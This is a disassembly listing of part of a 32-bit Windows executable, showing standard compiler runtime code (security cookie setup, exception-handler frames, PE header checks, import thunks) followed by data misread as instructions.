  4067ed:	add    eax,ecx
  4067ef:	test   ebx,ebx
  4067f1:	je     0x40680e
  4067f3:	mov    edi,DWORD PTR [ebp+0xc]
  4067f6:	mov    esi,DWORD PTR [eax+0xc]
  4067f9:	cmp    edi,esi
  4067fb:	jb     0x406806
  4067fd:	mov    ecx,DWORD PTR [eax+0x8]
  406800:	add    ecx,esi
  406802:	cmp    edi,ecx
  406804:	jb     0x406810
  406806:	inc    edx
  406807:	add    eax,0x28
  40680a:	cmp    edx,ebx
  40680c:	jb     0x4067f6
  40680e:	xor    eax,eax
  406810:	pop    edi
  406811:	pop    esi
  406812:	pop    ebx
  406813:	pop    ebp
  406814:	ret    
  406815:	int3   
  406816:	int3   
  406817:	int3   
  406818:	int3   
  406819:	int3   
  40681a:	int3   
  40681b:	int3   
  40681c:	int3   
  40681d:	int3   
  40681e:	int3   
  40681f:	int3   
  406820:	mov    edi,edi
  406822:	push   ebp
  406823:	mov    ebp,esp
  406825:	push   0xfffffffe
  406827:	push   0x406d10
  40682c:	push   0x406a50
  406831:	mov    eax,fs:0x0
  406837:	push   eax
  406838:	sub    esp,0x8
  40683b:	push   ebx
  40683c:	push   esi
  40683d:	push   edi
  40683e:	mov    eax,ds:0x407008
  406843:	xor    DWORD PTR [ebp-0x8],eax
  406846:	xor    eax,ebp
  406848:	push   eax
  406849:	lea    eax,[ebp-0x10]
  40684c:	mov    fs:0x0,eax
  406852:	mov    DWORD PTR [ebp-0x18],esp
  406855:	mov    DWORD PTR [ebp-0x4],0x0
  40685c:	push   0x400000
  406861:	call   0x4068f0
  406866:	add    esp,0x4
  406869:	test   eax,eax
  40686b:	je     0x4068c1
  40686d:	mov    eax,DWORD PTR [ebp+0x8]
  406870:	sub    eax,0x400000
  406875:	push   eax
  406876:	push   0x400000
  40687b:	call   0x4067d0
  406880:	add    esp,0x8
  406883:	test   eax,eax
  406885:	je     0x4068c1
  406887:	mov    eax,DWORD PTR [eax+0x24]
  40688a:	shr    eax,0x1f
  40688d:	not    eax
  40688f:	and    eax,0x1
  406892:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406899:	mov    ecx,DWORD PTR [ebp-0x10]
  40689c:	mov    DWORD PTR fs:0x0,ecx
  4068a3:	pop    ecx
  4068a4:	pop    edi
  4068a5:	pop    esi
  4068a6:	pop    ebx
  4068a7:	mov    esp,ebp
  4068a9:	pop    ebp
  4068aa:	ret    
  4068ab:	mov    eax,DWORD PTR [ebp-0x14]
  4068ae:	mov    eax,DWORD PTR [eax]
  4068b0:	xor    ecx,ecx
  4068b2:	cmp    DWORD PTR [eax],0xc0000005
  4068b8:	sete   cl
  4068bb:	mov    eax,ecx
  4068bd:	ret    
  4068be:	mov    esp,DWORD PTR [ebp-0x18]
  4068c1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4068c8:	xor    eax,eax
  4068ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4068cd:	mov    DWORD PTR fs:0x0,ecx
  4068d4:	pop    ecx
  4068d5:	pop    edi
  4068d6:	pop    esi
  4068d7:	pop    ebx
  4068d8:	mov    esp,ebp
  4068da:	pop    ebp
  4068db:	ret    
  4068dc:	int3   
  4068dd:	int3   
  4068de:	int3   
  4068df:	int3   
  4068e0:	int3   
  4068e1:	int3   
  4068e2:	int3   
  4068e3:	int3   
  4068e4:	int3   
  4068e5:	int3   
  4068e6:	int3   
  4068e7:	int3   
  4068e8:	int3   
  4068e9:	int3   
  4068ea:	int3   
  4068eb:	int3   
  4068ec:	int3   
  4068ed:	int3   
  4068ee:	int3   
  4068ef:	int3   
  4068f0:	mov    edi,edi
  4068f2:	push   ebp
  4068f3:	mov    ebp,esp
  4068f5:	mov    eax,DWORD PTR [ebp+0x8]
  4068f8:	mov    ecx,0x5a4d
  4068fd:	cmp    WORD PTR [eax],cx
  406900:	je     0x406906
  406902:	xor    eax,eax
  406904:	pop    ebp
  406905:	ret    
  406906:	mov    ecx,DWORD PTR [eax+0x3c]
  406909:	add    ecx,eax
  40690b:	xor    eax,eax
  40690d:	cmp    DWORD PTR [ecx],0x4550
  406913:	jne    0x406921
  406915:	mov    edx,0x10b
  40691a:	cmp    WORD PTR [ecx+0x18],dx
  40691e:	sete   al
  406921:	pop    ebp
  406922:	ret    
  406923:	int3   
  406924:	int3   
  406925:	int3   
  406926:	int3   
  406927:	int3   
  406928:	mov    edi,edi
  40692a:	push   ebp
  40692b:	mov    ebp,esp
  40692d:	sub    esp,0x14
  406930:	and    DWORD PTR [ebp-0xc],0x0
  406934:	and    DWORD PTR [ebp-0x8],0x0
  406938:	mov    eax,ds:0x407008
  40693d:	push   esi
  40693e:	push   edi
  40693f:	mov    edi,0xbb40e64e
  406944:	mov    esi,0xffff0000
  406949:	cmp    eax,edi
  40694b:	je     0x40695a
  40694d:	test   esi,eax
  40694f:	je     0x40695a
  406951:	not    eax
  406953:	mov    ds:0x40700c,eax
  406958:	jmp    0x4069c4
  40695a:	lea    eax,[ebp-0xc]
  40695d:	push   eax
  40695e:	call   DWORD PTR ds:0x408090
  406964:	mov    eax,DWORD PTR [ebp-0x8]
  406967:	xor    eax,DWORD PTR [ebp-0xc]
  40696a:	mov    DWORD PTR [ebp-0x4],eax
  40696d:	call   DWORD PTR ds:0x408094
  406973:	xor    DWORD PTR [ebp-0x4],eax
  406976:	call   DWORD PTR ds:0x408068
  40697c:	xor    DWORD PTR [ebp-0x4],eax
  40697f:	call   DWORD PTR ds:0x40808c
  406985:	xor    eax,DWORD PTR [ebp-0x4]
  406988:	lea    ecx,[ebp-0x4]
  40698b:	xor    eax,ecx
  40698d:	mov    DWORD PTR [ebp-0x4],eax
  406990:	lea    eax,[ebp-0x14]
  406993:	push   eax
  406994:	call   DWORD PTR ds:0x408098
  40699a:	mov    eax,DWORD PTR [ebp-0x10]
  40699d:	xor    eax,DWORD PTR [ebp-0x14]
  4069a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4069a3:	xor    ecx,eax
  4069a5:	cmp    ecx,edi
  4069a7:	je     0x4069b1
  4069a9:	test   DWORD PTR ds:0x407008,esi
  4069af:	jne    0x4069b6
  4069b1:	mov    ecx,0xbb40e64f
  4069b6:	mov    DWORD PTR ds:0x407008,ecx
  4069bc:	not    ecx
  4069be:	mov    DWORD PTR ds:0x40700c,ecx
  4069c4:	pop    edi
  4069c5:	pop    esi
  4069c6:	mov    esp,ebp
  4069c8:	pop    ebp
  4069c9:	ret    
  4069ca:	int3   
  4069cb:	int3   
  4069cc:	int3   
  4069cd:	int3   
  4069ce:	int3   
  4069cf:	push   0x30000
  4069d4:	push   0x10000
  4069d9:	call   DWORD PTR ds:0x4080fc
  4069df:	pop    ecx
  4069e0:	pop    ecx
  4069e1:	ret    
  4069e2:	int3   
  4069e3:	int3   
  4069e4:	int3   
  4069e5:	int3   
  4069e6:	int3   
  4069e7:	int3   
  4069e8:	jmp    DWORD PTR ds:0x408160
  4069ee:	int3   
  4069ef:	int3   
  4069f0:	int3   
  4069f1:	int3   
  4069f2:	int3   
  4069f3:	int3   
  4069f4:	push   0x406a50
  4069f9:	push   DWORD PTR fs:0x0
  406a00:	mov    eax,DWORD PTR [esp+0x10]
  406a04:	mov    DWORD PTR [esp+0x10],ebp
  406a08:	lea    ebp,[esp+0x10]
  406a0c:	sub    esp,eax
  406a0e:	push   ebx
  406a0f:	push   esi
  406a10:	push   edi
  406a11:	mov    eax,ds:0x407008
  406a16:	xor    DWORD PTR [ebp-0x4],eax
  406a19:	xor    eax,ebp
  406a1b:	mov    DWORD PTR [ebp-0x1c],eax
  406a1e:	push   eax
  406a1f:	mov    DWORD PTR [ebp-0x18],esp
  406a22:	push   DWORD PTR [ebp-0x8]
  406a25:	mov    eax,DWORD PTR [ebp-0x4]
  406a28:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406a2f:	mov    DWORD PTR [ebp-0x8],eax
  406a32:	lea    eax,[ebp-0x10]
  406a35:	mov    fs:0x0,eax
  406a3b:	ret    
  406a3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  406a3f:	xor    ecx,ebp
  406a41:	call   0x406340
  406a46:	jmp    0x406bbd
  406a4b:	int3   
  406a4c:	int3   
  406a4d:	int3   
  406a4e:	int3   
  406a4f:	int3   
  406a50:	mov    edi,edi
  406a52:	push   ebp
  406a53:	mov    ebp,esp
  406a55:	push   DWORD PTR [ebp+0x14]
  406a58:	push   DWORD PTR [ebp+0x10]
  406a5b:	push   DWORD PTR [ebp+0xc]
  406a5e:	push   DWORD PTR [ebp+0x8]
  406a61:	push   0x406340
  406a66:	push   0x407008
  406a6b:	call   0x406bd6
  406a70:	add    esp,0x18
  406a73:	pop    ebp
  406a74:	ret    
  406a75:	int3   
  406a76:	int3   
  406a77:	int3   
  406a78:	int3   
  406a79:	int3   
  406a7a:	int3   
  406a7b:	int3   
  406a7c:	int3   
  406a7d:	int3   
  406a7e:	int3   
  406a7f:	int3   
  406a80:	ret    
  406a81:	int3   
  406a82:	int3   
  406a83:	int3   
  406a84:	int3   
  406a85:	int3   
  406a86:	jmp    DWORD PTR ds:0x408158
  406a8c:	int3   
  406a8d:	int3   
  406a8e:	int3   
  406a8f:	int3   
  406a90:	int3   
  406a91:	jmp    0x406a9b
  406a96:	int3   
  406a97:	int3   
  406a98:	int3   
  406a99:	int3   
  406a9a:	int3   
  406a9b:	mov    edi,edi
  406a9d:	push   ebp
  406a9e:	mov    ebp,esp
  406aa0:	sub    esp,0x2d0
  406aa6:	mov    eax,ds:0x407008
  406aab:	xor    eax,ebp
  406aad:	mov    DWORD PTR [ebp-0x4],eax
  406ab0:	mov    DWORD PTR [ebp-0x220],eax
  406ab6:	mov    DWORD PTR [ebp-0x224],ecx
  406abc:	mov    DWORD PTR [ebp-0x228],edx
  406ac2:	mov    DWORD PTR [ebp-0x22c],ebx
  406ac8:	mov    DWORD PTR [ebp-0x230],esi
  406ace:	mov    DWORD PTR [ebp-0x234],edi
  406ad4:	data16 mov WORD PTR [ebp-0x208],ss
  406adb:	data16 mov WORD PTR [ebp-0x214],cs
  406ae2:	data16 mov WORD PTR [ebp-0x238],ds
  406ae9:	data16 mov WORD PTR [ebp-0x23c],es
  406af0:	data16 mov WORD PTR [ebp-0x240],fs
  406af7:	data16 mov WORD PTR [ebp-0x244],gs
  406afe:	pushf  
  406aff:	pop    DWORD PTR [ebp-0x210]
  406b05:	mov    eax,DWORD PTR [ebp+0x4]
  406b08:	mov    DWORD PTR [ebp-0x218],eax
  406b0e:	lea    eax,[ebp+0x4]
  406b11:	mov    DWORD PTR [ebp-0x2d0],0x10001
  406b1b:	mov    DWORD PTR [ebp-0x20c],eax
  406b21:	mov    eax,DWORD PTR [eax-0x4]
  406b24:	push   0x401128
  406b29:	mov    DWORD PTR [ebp-0x21c],eax
  406b2f:	call   DWORD PTR ds:0x408088
  406b35:	mov    ecx,DWORD PTR [ebp-0x4]
  406b38:	xor    ecx,ebp
  406b3a:	call   0x406340
  406b3f:	mov    esp,ebp
  406b41:	pop    ebp
  406b42:	ret    
  406b43:	int3   
  406b44:	int3   
  406b45:	int3   
  406b46:	int3   
  406b47:	int3   
  406b48:	jmp    DWORD PTR ds:0x408150
  406b4e:	int3   
  406b4f:	int3   
  406b50:	int3   
  406b51:	int3   
  406b52:	int3   
  406b53:	int3   
  406b54:	jmp    DWORD PTR ds:0x40814c
  406b5a:	int3   
  406b5b:	int3   
  406b5c:	int3   
  406b5d:	int3   
  406b5e:	int3   
  406b5f:	int3   
  406b60:	jmp    DWORD PTR ds:0x408148
  406b66:	int3   
  406b67:	int3   
  406b68:	int3   
  406b69:	int3   
  406b6a:	int3   
  406b6b:	int3   
  406b6c:	jmp    DWORD PTR ds:0x408144
  406b72:	int3   
  406b73:	int3   
  406b74:	int3   
  406b75:	int3   
  406b76:	int3   
  406b77:	int3   
  406b78:	push   0x406a50
  406b7d:	push   DWORD PTR fs:0x0
  406b84:	mov    eax,DWORD PTR [esp+0x10]
  406b88:	mov    DWORD PTR [esp+0x10],ebp
  406b8c:	lea    ebp,[esp+0x10]
  406b90:	sub    esp,eax
  406b92:	push   ebx
  406b93:	push   esi
  406b94:	push   edi
  406b95:	mov    eax,ds:0x407008
  406b9a:	xor    DWORD PTR [ebp-0x4],eax
  406b9d:	xor    eax,ebp
  406b9f:	push   eax
  406ba0:	mov    DWORD PTR [ebp-0x18],esp
  406ba3:	push   DWORD PTR [ebp-0x8]
  406ba6:	mov    eax,DWORD PTR [ebp-0x4]
  406ba9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406bb0:	mov    DWORD PTR [ebp-0x8],eax
  406bb3:	lea    eax,[ebp-0x10]
  406bb6:	mov    fs:0x0,eax
  406bbc:	ret    
  406bbd:	mov    ecx,DWORD PTR [ebp-0x10]
  406bc0:	mov    DWORD PTR fs:0x0,ecx
  406bc7:	pop    ecx
  406bc8:	pop    edi
  406bc9:	pop    edi
  406bca:	pop    esi
  406bcb:	pop    ebx
  406bcc:	mov    esp,ebp
  406bce:	pop    ebp
  406bcf:	push   ecx
  406bd0:	ret    
  406bd1:	int3   
  406bd2:	int3   
  406bd3:	int3   
  406bd4:	int3   
  406bd5:	int3   
  406bd6:	jmp    DWORD PTR ds:0x408100
  406bdc:	int3   
  406bdd:	int3   
  406bde:	int3   
  406bdf:	int3   
  406be0:	int3   
  406be1:	int3   
  406be2:	int3   
  406be3:	int3   
  406be4:	int3   
  406be5:	int3   
  406be6:	int3   
  406be7:	int3   
  406be8:	int3   
  406be9:	int3   
  406bea:	int3   
  406beb:	int3   
  406bec:	int3   
  406bed:	int3   
  406bee:	int3   
  406bef:	int3   
  406bf0:	push   ecx
  406bf1:	lea    ecx,[esp+0x4]
  406bf5:	sub    ecx,eax
  406bf7:	sbb    eax,eax
  406bf9:	not    eax
  406bfb:	and    ecx,eax
  406bfd:	mov    eax,esp
  406bff:	and    eax,0xfffff000
  406c04:	cmp    ecx,eax
  406c06:	jb     0x406c12
  406c08:	mov    eax,ecx
  406c0a:	pop    ecx
  406c0b:	xchg   esp,eax
  406c0c:	mov    eax,DWORD PTR [eax]
  406c0e:	mov    DWORD PTR [esp],eax
  406c11:	ret    
  406c12:	sub    eax,0x1000
  406c17:	test   DWORD PTR [eax],eax
  406c19:	jmp    0x406c04
  406c1b:	int3   
  406c1c:	int3   
  406c1d:	int3   
  406c1e:	int3   
  406c1f:	int3   
  406c20:	jmp    DWORD PTR ds:0x408170
  406c26:	int3   
  406c27:	int3   
  406c28:	int3   
  406c29:	int3   
  406c2a:	int3   
  406c2b:	int3   
  406c2c:	int3   
  406c2d:	int3   
  406c2e:	int3   
  406c2f:	int3   
  406c30:	mov    ecx,0x407448
  406c35:	jmp    0x404eb3
  406c3a:	int3   
  406c3b:	int3   
  406c3c:	int3   
  406c3d:	int3   
  406c3e:	int3   
  406c3f:	int3   
  406c40:	push   0x4074a0
  406c45:	call   DWORD PTR ds:0x408064
  406c4b:	jmp    0x405e94
  406c50:	int3   
  406c51:	int3   
  406c52:	int3   
  406c53:	int3   
  406c54:	int3   
  406c55:	int3   
  406c56:	int3   
  406c57:	int3   
  406c58:	int3   
  406c59:	int3   
  406c5a:	int3   
  406c5b:	int3   
  406c5c:	int3   
  406c5d:	int3   
  406c5e:	int3   
  406c5f:	int3   
  406c60:	mov    edx,DWORD PTR ds:0x40748c
  406c66:	call   0x405ec0
  406c6b:	jmp    0x405f54
  406c70:	int3   
  406c71:	int3   
  406c72:	int3   
  406c73:	int3   
  406c74:	int3   
  406c75:	int3   
  406c76:	int3   
  406c77:	int3   
  406c78:	int3   
  406c79:	int3   
  406c7a:	int3   
  406c7b:	int3   
  406c7c:	int3   
  406c7d:	int3   
  406c7e:	int3   
  406c7f:	int3   
  406c80:	jmp    0x405c7c
  406c85:	int3   
  406c86:	int3   
  406c87:	int3   
  406c88:	(bad)  
  406c89:	(bad)  
  406c8a:	(bad)  
  406c8b:	inc    DWORD PTR [eax]
  406c8d:	add    BYTE PTR [eax],al
  406c8f:	add    ah,dl
  406c91:	(bad)  
  406c92:	(bad)  
  406c93:	inc    DWORD PTR [eax]
  406c95:	add    BYTE PTR [eax],al
  406c97:	add    dh,bh
  406c99:	(bad)  
  406c9a:	(bad)  
  406c9b:	push   edi
  406c9d:	sub    BYTE PTR [eax+0x0],al
  406ca0:	or     ch,BYTE PTR [ecx]
  406ca2:	inc    eax
  406ca3:	add    BYTE PTR [eax],al
  406ca5:	add    BYTE PTR [eax],al
  406ca7:	add    ah,ah
  406ca9:	(bad)  
  406caa:	(bad)  
  406cab:	inc    DWORD PTR [eax]
  406cad:	add    BYTE PTR [eax],al
  406caf:	add    BYTE PTR [edi+edi*8+0xffff],al
  406cb6:	add    BYTE PTR [eax],al
  406cb8:	(bad)  
  406cb9:	(bad)  
  406cba:	(bad)  
  406cbb:	push   DWORD PTR [esi-0x45ffbf9e]
  406cc1:	bound  eax,QWORD PTR [eax+0x0]
  406cc4:	(bad)  
  406cc5:	(bad)  
  406cc6:	(bad)  
  406cc7:	jmp    FWORD PTR [edx+0x62]
  406cca:	inc    eax
  406ccb:	add    BYTE PTR [esi+0x62],bh
  406cce:	inc    eax
  406ccf:	add    ah,ah
  406cd1:	(bad)  
  406cd2:	(bad)  
  406cd3:	inc    DWORD PTR [eax]
  406cd5:	add    BYTE PTR [eax],al
  406cd7:	add    al,cl
  406cd9:	(bad)  
  406cda:	(bad)  
  406cdb:	inc    DWORD PTR [eax]
  406cdd:	add    BYTE PTR [eax],al
  406cdf:	add    dh,bh
  406ce1:	(bad)  
  406ce2:	(bad)  
  406ce3:	inc    DWORD PTR [eax]
  406ce5:	add    BYTE PTR [eax],al
  406ce7:	add    BYTE PTR [eax+0x66],bl
  406cea:	inc    eax
  406ceb:	add    BYTE PTR [eax],al
  406ced:	add    BYTE PTR [eax],al
  406cef:	add    dh,bh
  406cf1:	(bad)  
  406cf2:	(bad)  
  406cf3:	inc    DWORD PTR [eax]
  406cf5:	add    BYTE PTR [eax],al
  406cf7:	add    ah,dl
  406cf9:	(bad)  
  406cfa:	(bad)  
  406cfb:	inc    DWORD PTR [eax]
  406cfd:	add    BYTE PTR [eax],al
  406cff:	add    dh,bh
  406d01:	(bad)  
  406d02:	(bad)  
  406d03:	call   FWORD PTR [edi+eiz*2+0x40]
  406d07:	add    BYTE PTR [eax+0x67],ah
  406d0a:	inc    eax
  406d0b:	add    BYTE PTR [eax],al
  406d0d:	add    BYTE PTR [eax],al
  406d0f:	add    dh,bh
  406d11:	(bad)  
  406d12:	(bad)  
  406d13:	inc    DWORD PTR [eax]
  406d15:	add    BYTE PTR [eax],al
  406d17:	add    al,bl
  406d19:	(bad)  
  406d1a:	(bad)  
  406d1b:	inc    DWORD PTR [eax]
  406d1d:	add    BYTE PTR [eax],al
  406d1f:	add    dh,bh
  406d21:	(bad)  
  406d22:	(bad)  
  406d23:	jmp    FWORD PTR [ebx-0x41ffbf98]
  406d29:	push   0x40
  406d2e:	add    BYTE PTR [eax],al
  406d30:	adc    BYTE PTR [eax+0x40],dh
  406d33:	add    BYTE PTR [eax],al
  406d35:	add    BYTE PTR [eax],al
	...
